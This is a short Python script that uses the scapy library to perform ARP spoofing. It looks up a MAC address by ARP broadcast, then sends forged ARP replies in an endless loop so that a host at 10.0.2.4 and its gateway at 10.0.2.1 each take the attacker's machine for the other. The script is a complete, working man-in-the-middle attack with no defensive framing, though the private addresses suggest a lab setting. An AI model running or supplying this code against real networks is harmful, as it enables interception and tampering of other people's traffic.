import time
from scapy.all import srp, send
from scapy.layers.l2 import ARP, Ether

def get_mac(ip):
    '''
        Performs ARP scan on target IP or IP range

        Parameters:
            ip - target IP or IP range

        Returns:
            MAC address of target ip
    '''
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet)

if __name__ == "__main__":
    while True:
        spoof('10.0.2.4', '10.0.2.1')
        spoof('10.0.2.1', '10.0.2.4')
        time.sleep(5)